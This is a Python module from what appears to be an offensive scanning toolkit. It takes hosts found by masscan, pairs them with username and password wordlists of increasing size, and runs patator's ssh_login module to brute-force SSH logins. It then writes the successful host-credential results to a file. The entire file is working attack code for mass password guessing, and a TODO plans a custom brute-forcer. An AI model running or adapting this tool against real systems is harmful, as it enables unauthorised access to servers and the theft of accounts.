# -*- coding: utf-8 -*-


# TODO: remove all code associated with patator utility and write own bruteforce utility by ssh.


import subprocess

from collections import namedtuple

from bs4 import BeautifulSoup

from libs import uix
from libs import utils


class Bruteforce(object):
    def __init__(self):
        self.hosts_files = utils.show_results_files('masscan', 'hosts')     # List of result files in masscan dir.
        self.directory = utils.get_path_to_dir('bruteforce')                # Path to bruteforce directory.
        self.result_dir = None                                              # Results dir in bruteforce directory.

    def parse_result_file(self):
        date = utils.date_today()

        # Read and parse data.
        with open(self.result_dir + '/RESULTS.xml') as file:
            bs_obj = BeautifulSoup(file, 'lxml-xml')

        candidates = bs_obj.findAll('candidate')
        hosts_num = len(candidates)
        mesgs = bs_obj.findAll('mesg')
        start_time = bs_obj.find('start')['utc']
        stop_time = bs_obj.find('stop')['utc']

        # Write filtered data in new file.
        for i in range(hosts_num):
            host = candidates[i].text
            mesg = mesgs[i].text

            pattern = f'{host}:{mesg}'.replace('"', '')

            with open(self.result_dir + f'/filtered_result_{date}', 'a') as file:
                file.writelines(pattern)

        return uix.bruteforce_result_msg(start_time, stop_time, hosts_num)

    @staticmethod
    def configure_wordlists_for_brute(hosts, bruteforce_type):
        abs_path = utils.get_abs_path_to_dir('wordlists')

        wordlists = {
            'users_small': abs_path + '/usernames_small.lst',
            'users_big': abs_path + '/usernames_big.lst',
            'pas_low': abs_path + '/passwds_low.lst',
            'pas_medium': abs_path + '/passwds_medium.lst',
            'pas_high': abs_path + '/passwds_high.lst.bz2',
        }

        configured_wordlist = namedtuple('configured_wordlist', ['hosts', 'usernames', 'passwords'])

        configured_wordlists = {
            '0': configured_wordlist(hosts, wordlists.get('users_small'), wordlists.get('pas_low')),
            '1': configured_wordlist(hosts, wordlists.get('users_small'), wordlists.get('pas_medium')),
            '2': configured_wordlist(hosts, wordlists.get('users_big'), wordlists.get('pas_high')),
            '3': bruteforce_type,
        }

        if isinstance(bruteforce_type, tuple):
            return configured_wordlists.get('3')

        return configured_wordlists.get(bruteforce_type)

    def configure_command(self, hosts_file, port, bruteforce_type):
        date = utils.date_today()
        self.result_dir = f'{self.directory}/{port}_{date}'
        configured_wordlists = self.configure_wordlists_for_brute(hosts_file, bruteforce_type)

        command = ['patator', 'ssh_login', 'host=FILE2', 'user=FILE1', 'password=FILE0',
                   f'2={configured_wordlists.hosts}', f'1={configured_wordlists.usernames}',
                   f'0={configured_wordlists.passwords}', '-x', 'ignore:code=1',
                   '-l', f'{self.directory}/{port}_{date}']

        return command

    def start_bruteforce(self, user_input, bruteforce_type):
        abs_path = utils.get_abs_path_to_dir('results/masscan/')

        try:
            hosts_file = abs_path + '/' + self.hosts_files[int(user_input)]
            port = utils.get_port_from_file_name(hosts_file)
        except ValueError:
            port = '22'
            hosts_file = user_input

        command = self.configure_command(hosts_file, port, bruteforce_type)
        subprocess.run(command, stdout=subprocess.PIPE, encoding='utf-8')
        msg = self.parse_result_file()
        uix.show_menu(msg=msg)

    def run(self):
        user_input, bruteforce_type = uix.bruteforce_start_msg(self.hosts_files)
        self.start_bruteforce(user_input, bruteforce_type)

